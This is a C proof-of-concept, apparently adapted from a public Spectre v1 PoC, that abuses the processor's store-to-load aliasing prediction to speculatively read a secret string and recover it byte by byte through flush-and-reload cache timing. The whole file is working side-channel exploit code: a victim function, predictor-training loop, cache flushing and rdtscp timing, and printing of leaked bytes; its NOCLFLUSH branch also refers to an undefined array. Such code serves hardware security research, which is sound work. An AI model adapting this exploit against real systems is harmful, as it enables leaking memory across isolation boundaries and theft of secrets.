/*********************************************************************
*
* This source code is based off the Spectre v1 PoC
* found at https://github.com/crozone/SpectrePoC.git
*
**********************************************************************/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */

#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint32_t array1[16] = { 0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba, 0xbb, 0xbc, 0xbd, 0xbe, 0xbf };
uint8_t unused2[64];
uint8_t array2[256 * 512];
int32_t big_block[4096];
#define NUM_PAGES 1024
volatile int32_t* load_addrs[NUM_PAGES];
#define NUM_BAGS (4096/(sizeof(int32_t)))
volatile int32_t store_addrs[NUM_BAGS];

const uint32_t secret[] = {'T', 'h', 'e', ' ', 'M', 'a', 'g', 'i', 'c', ' ', 'W', 'o', 'r', 'd', 's', ' ', 'a', 'r', 'e', ' ', 'S', 'q', 'u', 'e', 'a', 'm', 'i', 's', 'h', ' ', 'O', 's', 's', 'i', 'f', 'r', 'a', 'g', 'e', '.' };

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */


/* By training the aliasing detection, we can cause *load_addr to load the
 * value stored at *store_addr even when store_addr != load_addr. We abuse this
 * to read and leak values of secret[] through *load_addr, despite *load_addr
 * never actually containing these values. */
void victim_function(size_t x, register volatile int32_t* store_addr, register volatile int32_t* load_addr,  uint64_t  training_alias, uint64_t malicious_alias) {
 // printf("store_addr: %p load_addr: %p    x: %p   malicious pass: %p   \n", store_addr, load_addr, x, mal);

  *store_addr = array1[x]+1;
  // placing an lfence here after the store prevents the vulnerability
//          alias_p = (int32_t*)(training_alias ^ (x & (malicious_alias ^ training_alias)));
  if (load_addr == store_addr) _mm_lfence();

 temp &= array2[(*(load_addr)-1) * 512];
 //  temp &= array2[(*((int32_t*)(training_alias ^ (x & (malicious_alias ^ training_alias))))-1) * 512];
}


/********************************************************************
Analysis code
********************************************************************/

/* Find accessed cache lines corresponding to ASCII values */
void readMemoryByte(int cache_hit_threshold, size_t malicious_x, int results[256], int pagenum, int dropnum) {
  int tries, i, j, k, mix_i;
  unsigned int junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;

  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = 1999; tries > 0; tries--) {

    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */

    training_x = tries % array1_size;
    uint64_t training_alias = (uint64_t)&store_addrs[dropnum];
    uint64_t malicious_alias = (uint64_t)load_addrs[pagenum];
    int32_t* alias_p;
    for (int k = 0; k < 500; k++) {
      for (j = 25-1; j >= 0; j--) {
        /* Bit twiddling to set x=training_x if j%25!=0 or malicious_x if j%25==0 */
        /* Avoid jumps in case those tip off the branch predictor */
        x = (j - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%25==0, else x=0 */
        x = (x | (x >> 16)); /* Set x=-1 if j&25=0, else x=0 */
        // set alias_p to truly alias the store_addr if j%25!=0,
        // and NOT alias the store_addr if j%25==0
        alias_p = (int32_t*)(training_alias ^ (x & (malicious_alias ^ training_alias)));
        x = training_x ^ (x & (malicious_x ^ training_x));

        _mm_clflush( (int32_t*)malicious_alias);

        /* Delay */
        for (volatile int z = 0; z < 400; z++) {}
        _mm_lfence();

        /* Call the victim! */
        victim_function(x, &store_addrs[dropnum], alias_p, training_alias, malicious_alias);
      }
    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = & array2[mix_i * 512];

    /*
    We need to accurately measure the memory access to the current index of the
    array so we can determine which index was cached by the malicious mispredicted code.

    The best way to do this is to use the rdtscp instruction, which measures current
    processor ticks, and is also serialized.
    */

      time1 = __rdtscp( & junk); /* READ TIMER */
      junk = * addr; /* MEMORY ACCESS TO TIME */
      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */

      if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
        results[mix_i]++; /* cache hit - add +1 to score for this value */
    }

    /* Detect cache lines */
  }
  printf(">");
  for (i = 32; i < 128; i++) { // printable range
    if (results[i] > 0) {
#if COLORS
      if (i == array1[malicious_x])
        printf("\x1b[1;41m");
#endif
      printf("%c", i);
#if COLORS
      if (i == array1[malicious_x])
        printf("\x1b[0m");
#endif
    }
  }
  printf("< ");
  for (i = 0; i < 256; i++) {
    if (results[i] > 0) {
      printf("%02x/%d ", i, results[i]);
    }
  }
  results[0] ^= junk; /* use junk so code above won't get optimized out*/
}

/*
*  Command line arguments:
*  1: Cache hit threshold (int)
*  2: Malicious address start (size_t)
*  3: Malicious address count (int)
*/
int main(int argc,
  const char * * argv) {
  
  /* Default to a cache hit threshold of 80 */
  int cache_hit_threshold = 80;

  /* Default for malicious_x is the secret string address */
  size_t malicious_x = (size_t)(secret -  array1);
  
  /* Default addresses to read is 40 (which is the length of the secret string) */
  int len = 40;
  
  int i;

  #ifdef NOCLFLUSH
  for (i = 0; i < (int)sizeof(cache_flush_array); i++) {
    cache_flush_array[i] = 1;
  }
  #endif

  int fd = open("mmap", O_CREAT | O_TRUNC | O_RDWR, S_IRUSR | S_IWUSR);
  if (fd < 1) {
    perror(NULL);
    exit(1);
  }
  ftruncate(fd, 0x1000 * NUM_PAGES);
  int32_t* mmap_base = mmap(NULL, 0x1000 * NUM_PAGES, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

  // arbitrarily chosen
  int dropnum = 33;

  uint64_t alias_base = (uint64_t)mmap_base;
  // touch all the pages
  for (i = 0; i < NUM_PAGES; i++) {
    load_addrs[i] = (int32_t*)((((uint64_t)&store_addrs[dropnum]) & 0xfff) + (alias_base + i * 0x1000));
    *(load_addrs[i]) = 0xDD;
  }

  // arbitrarily chosen
  int pagenum = 4;

  // offset so lower bits don't match
  load_addrs[pagenum] = (int32_t*)(((uint64_t)load_addrs[pagenum]) + 37);

  printf("store_addr: %p\n load_addr: %p\n      mmap: %p\n      diff: 0x%012lx\n", &store_addrs[dropnum], load_addrs[pagenum], mmap_base, (uint64_t)load_addrs[pagenum] - (uint64_t)mmap_base);
  printf("&array1_size: %p\n", &array1_size);

  // touch the chosen page again just to be sure
  *(load_addrs[pagenum]) = 0xCC;

  for (i = 0; i < (int)sizeof(array2); i++) {
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
  }

  /* Parse the cache_hit_threshold from the first command line argument.
     (OPTIONAL) */
  if (argc >= 2) {
    sscanf(argv[1], "%d", &cache_hit_threshold);
  }

  /* Print git commit hash */
  #ifdef GIT_COMMIT_HASH
    printf("Version: commit " GIT_COMMIT_HASH "\n");
  #endif
  
  /* Print cache hit threshold */
  printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);

  printf("\n");

  int results[256];

  printf("Reading %d bytes:\n", len);

  /* Start the read loop to read each address */
  i = 0;
  while (--len >= 0) {
    printf("Reading at malicious_x = %p... ", (void * ) malicious_x);

    /* Call readMemoryByte with the required cache hit threshold and
         malicious x address.
       Output is of the form xx/nnnn, where xx is the cached index and nnnn is
         the number of detected hits.
       Any detected ASCII characters are printed between the >< arrows.
    */
    readMemoryByte(cache_hit_threshold, malicious_x++, results, pagenum, dropnum);

    i++;
    printf("\n");
  }
  return (0);
}
